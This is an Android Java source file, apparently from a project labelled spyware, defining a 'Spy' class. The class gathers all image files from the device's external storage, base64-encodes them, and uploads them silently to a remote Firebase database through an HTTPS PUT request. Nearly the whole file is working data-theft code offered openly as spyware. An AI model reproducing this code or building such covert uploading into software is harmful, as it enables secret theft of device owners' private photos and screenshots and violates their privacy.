package com.example.cristianturetta.spyware;

import android.os.Environment;
import android.util.Base64;
import android.util.Log;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import javax.net.ssl.HttpsURLConnection;

public class Spy {
    static private Spy mInstance;

    private Spy(){}

    public static Spy getInstance(){
        if (mInstance == null){
            synchronized (Spy.class){
                if (mInstance == null){
                    mInstance = new Spy();
                }
            }
        }
        return mInstance;
    }

    public void sendRecordedData(){
        String directory = "/users.json";

        try {
            URL databaseURL = new URL(FirebaseConfig.getDatabaseURL() + directory);
            HttpsURLConnection urlConnection = (HttpsURLConnection) databaseURL.openConnection();

            urlConnection.setRequestMethod("PUT");
            urlConnection.setDoOutput(true);
            urlConnection.setRequestProperty("Content-Type", "application/json");
            urlConnection.setRequestProperty("Accept", "application/json");

            JSONObject jsonObject = new JSONObject();
            jsonObject.put("screen", encodeScreenshots());
            setPostRequestContent(urlConnection, jsonObject);

            urlConnection.connect();
            Log.d("Spy", "Firebase resp. code " + urlConnection.getResponseCode());
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private void setPostRequestContent(HttpsURLConnection conn, JSONObject jsonObject) throws IOException {
        OutputStream os = conn.getOutputStream();
        BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
        writer.write(jsonObject.toString());
        writer.flush();
        writer.close();
        os.close();
    }

    private JSONObject encodeScreenshots(){
        InputStream inputStream;
        ArrayList<File> screenshots = FileUtil.getInstance().getAllImagesFrom(Environment.getExternalStorageDirectory());
        List<JSONObject> base64screenshots = new ArrayList<>();

        try {
            for (File file: screenshots) {
                byte[] content = new byte[(int) file.length()];
                inputStream = new FileInputStream(file);
                for (int off = 0, read; (read = inputStream.read(content, off, content.length - off)) > 0; off += read);
                String base64file = Base64.encodeToString(content, Base64.DEFAULT);
                base64screenshots.add((new JSONObject()).put(file.getName(), base64file));
            }

            return (new JSONObject()).put(String.valueOf(new Date().getTime()), base64screenshots);

        } catch (ProtocolException e) {
            e.printStackTrace();
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }

        /* Decode Base&4 file
        byte[] decodedString = Base64.decode(base64, Base64.DEFAULT);
        Bitmap decodedByte = BitmapFactory.decodeByteArray(decodedString, 0, decodedString.length);
        */
        return new JSONObject();
    }
}
